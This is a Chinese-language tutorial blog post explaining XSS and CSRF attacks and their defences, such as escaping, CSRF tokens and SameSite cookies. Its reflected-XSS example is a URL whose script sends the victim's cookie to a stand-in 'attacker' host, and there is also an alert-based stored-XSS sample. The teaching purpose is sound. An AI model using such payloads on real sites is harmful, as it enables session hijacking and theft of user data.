---
tags: 
  - xss
  - csrf
---

# 安全問題：XSS 和 CSRF

<Tags :tags="$page.frontmatter.tags" />

在前端安全議題裡，最常碰到的就是 `XSS` 跟 `CSRF`。

[[TOC]]

## Cross-site scription (XSS)

為了避免與 CSS 混淆，因此將 C 的 Cross 改成交叉狀的 X，變成 XSS。

- **發生原因**：太相信使用者傳來的訊息、資源，沒有做任何的查驗或 format
- **惡意內容**：包含 `<script>` 的 js、HTML、Flash 等 browser 可以執行的程式碼，植入進原本的網站
- **攻擊對象**：開啟含有惡意程式碼網站的使用者

基於 XSS 攻擊的方法非常廣泛，但攻擊者多半是為了將 cookie 或 session 資料傳送給自己，或是將被使用者導向惡意網站，更甚至是在使用者的電腦上做其他操作。

### 攻擊種類

#### 1. Stored/Persistent XSS attack

情境像是**留言板、社交平台、表單**，只要有開放使用者輸入的 text field 都有可能被放進惡意 script，如果沒有先過濾資料再存進 database，之後任一個使用者只要需要看到這筆資料或留言，後端都會取出這段內容交給前端顯示在瀏覽器上，瀏覽器讀取到擁有那段程式碼的內容，就執行那段惡意 script。

🚀 範例：攻擊者在留言區輸入了下方文字，當其他人到該留言頁面時，就會直接彈出一個 alert 視窗。

```
感謝分享～
<a href="javascript: alert('xss attack!')">Click me!</a>
```

#### 2. Reflected XSS attack

常發生在**將搜尋結果顯示在畫面上的情境**。透過 URL 傳參的漏洞，攻擊者可以把一段帶有搜尋參數的網址貼給受害者，如果後端沒有過濾就直接把前端傳過來的參數作為 response 傳回前端，就會在結果的地方執行惡意腳本。

🚀 範例：攻擊者誘使他人點了下方連結，後端直接將 keyword 參數內容回給瀏覽器顯示，便自動執行 `<script>` 裡的惡意操作

```
http://website/search?keyword=<script>window.location='http://attacker/?cookie='+document.cookie</script> 
```

#### 3. DOM-based XSS attack

前兩類是後端接收資料後沒有先做一層過濾的問題，**但若發生 DOM-based 攻擊的話，就是你的問題了（中箭）。**

跟 Reflected 同樣都是藉由網址傳參的方式，但是 DOM-based 的情形中，後端並沒有傳回任何含有惡意 script 的結果給前端，而是前端直接取用有問題的參數使用像是 `innerHTML = someMaliciousParameter` 來顯示畫面。

::: tip As a vue programmer
在 Vue.js 中有時會使用到 `v-html` 來 render 含有 html tag 的 string，綜上所述，除非你是用在像是 i18n 這種是自己設定的內容，或是你**真的真的真的真的**很相信來源，不然千萬要小心使用。
:::

### 防範方法

我認為沒有比 OWASP 寫得還清楚的 [prevention cheat sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md) 了，所以以下只做簡單的說明：

::: warning 只要將某些字直接過濾，像是將 script 字眼全刪掉就沒事了？
可是如果一則正常的內容是 `我喜歡 javascript`，就會變成 `我喜歡 java`，這不行。
:::

所以重點應該是要 encode、escape（跳脫） 某些字元，像是 `"` encode 後變成 `&quot;`，而畫面上還是會顯示 `"`。而這過程要注意的重點千千百百個，在上述的 OWASP XSS 預防小抄中已有詳述。

### 結論

**永遠不要直接存入／顯示來自使用者的內容。**

::: tip 補充
有位日本工程師做了一個網站 [XSS Challenges](http://xss-quiz.int21h.jp/) 讓大家嘗試用各種 XSS 攻擊它，來挑戰一下吧！👻<br/>
:::

## Cross Site Request Forgery (CSRF)

中文為**跨站請求偽造**。由於在對後端發送 request 的時候會自動將 cookie 夾帶上去，攻擊者就利用這一點，製造出是由你發出 request 的假象，因為對後端而言，發出 request 的是你本人沒錯（像是利用 cookie 中的 token 確認你的執行權限足夠），但是你並不知道你發出了這個 request。

所以 CSRF 是一種**一點就中招**的攻擊方式，主要是讓你點下含有目標網站的網址及相關參數，讓你在不知情的情形下對目標網站發送 request。

### 防範方法

分成三個面向－**使用者**、**後端**及**瀏覽器**：

#### 使用者

在不使用網站時清除認證後的依據，像是登出，或是清除 cookie（通常也會自動登出），但是難保你會在使用網站時點到惡意連結。而且這個習慣相信決大部分的人都很難養成。

#### 後端

1. **檢查 referer**：使用者本人發送的 request referer 會是該網站，而 CSRF 發送的 request referer 則會是其他網站，但若是直接判斷 referer 是否合法會有問題，像是瀏覽器可能沒帶 referer、使用者關閉自動帶 referer，或是判斷 referer 的 function 有漏洞等，都可能會有問題
2. **加其他驗證法**：例如圖形驗證或是簡訊驗證碼等第三方驗證功能，都可以在發送 request 之前確定這的確是本人來自原網站的行為。這適用在不會頻繁使用的情境上，像是登入、轉帳等，但如果是頻繁操作的 request 可能會造成使用者的不便
3. **夾帶 csrftoken**：將一組由 server 生成出的 token 夾帶在任何隱藏的區域，像是 http request 的 header、form 的欄位等，帶給後端後交給後端驗證這個 csrftoken 是否有效。但是後端會需要記得這組 token 的狀態性。
4. **double submit cookie**：與上一項不一樣的是，server 不用儲存任何東西來確認 token 是否有效或過期，而是藉由比對隱藏區域的 token 跟 cookie 裡面的 token 是否一樣來達到驗證效果。就算攻擊者已經將一組他自己編的 token 寫在 form 裡面了，但他沒有權限去修改或寫入使用者瀏覽器裡的 cookie，所以還是不會成功。**但是！** subdomain 有權限修改 domain 的 cookie，所以如果攻擊者掌握了任何一個 subdomain，那這方法就會失效。

#### 瀏覽器

更改 cookie 的 attribute。cookie 的 attribute 裡有一項 `SameSite` ，對應的值會決定要不要把 cookie 帶給這次的 request，他有三種不一樣的設定：

1. **Strict**：只有 same-site 的 request 才能夾帶此 cookie。只有在 a.com 傳送到 a.com api 的 request 才會夾帶。像是我已經是登入 medium，在我點了別人傳來的另一個 medium 的網站就會失去登入狀態，因為 cookie 並沒有被夾帶送出去
2. **Lax**：大部分瀏覽器的預設值。放寬了像是 `<a>` `<form method="GET">` 等可以將 cookie 夾帶出去，在上例中跳轉到 medium 就會呈現登入狀態，但是其他的 cross-site 異步請求如 post 就不會帶上 cookie。基本上可以擋掉除了 GET 之外的 CSRF 攻擊。
3. **None**：無論是 same-site 或是 cross-site 的 request 都可以帶有這個 cookie

::: tip 補充
- same-site 的定義是 `同個網站`，同個網站 ≠ 同源，例如：
  - subdomain & domain：同源 ❌，同網站 ⭕️
  - 同個 domain 不同 port：同源 ❌，同網站 ⭕️
- Chrome 的預設是 `Lax`，如果要改成 `none` 就要多加 `Secure` 屬性，讓這個 cookie 只能透過 `https` 發送，不然無效
:::

### 結論

由於各大瀏覽器對 cookie same-site 的設定要求，因此只要在不同使用情境上妥善設定好 cookie，就能讓 CSRF 攻擊的發生機率大大降低，

另外這是我在查看資料的時候，看到一則在 2007 年，Gamil 發生的 CSRF 事件：[Warning: Google Gamil security failure](https://www.davidairey.com/google-Gmail-security-hijack)。

## 後記

在看網頁資安問題時才知道 [OWASP (Open Web Application Security Project)](https://owasp.org/) 這個組織，這個無營利組織探討並羅列了各種網頁應用上的資安問題。

有趣的是，看看前十大網頁安全問題 ([OWASP Top Ten](https://owasp.org/www-project-top-ten/))，CSRF 在 2017 年就已經不在之列了。

## 參考文章 

1. [XSS Filter Evasion Cheat Sheet | OWASP](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
2. [讓我們來談談 CSRF | TechBridge 技術共筆部落格](https://blog.techbridge.cc/2017/02/25/csrf-introduction/)

<CustomVssue :title="$page.title" />